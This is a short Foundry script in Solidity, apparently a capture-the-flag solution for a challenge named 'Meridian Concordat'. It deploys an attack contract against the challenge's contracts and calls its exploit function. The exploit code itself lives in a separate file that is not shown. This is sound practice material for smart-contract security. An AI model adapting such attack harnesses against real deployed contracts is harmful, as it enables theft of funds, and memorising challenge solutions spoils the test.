// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Script.sol";
import {IChallenge} from "src/meridian-concordat/IMeridianConcordat.sol";
import {MeridianConcordatAttack} from "src/meridian-concordat/MeridianConcordatAttack.sol";

contract MeridianConcordatScript is Script {
    function run() external {
        address challengeAddr = vm.envAddress("CHALLENGE_ADDRESS");
        address player = vm.envAddress("PLAYER_ADDRESS");
        IChallenge challenge = IChallenge(challengeAddr);

        address capsule = 0x47A849889029A91b005779C95D237b0b0d667791;

        vm.startBroadcast();

        MeridianConcordatAttack attack = new MeridianConcordatAttack(
            challenge.BOREAS(),
            challenge.HELIX(),
            challenge.AXIOM(),
            challenge.MRC(),
            capsule,
            player
        );
        attack.exploit();

        vm.stopBroadcast();
    }
}
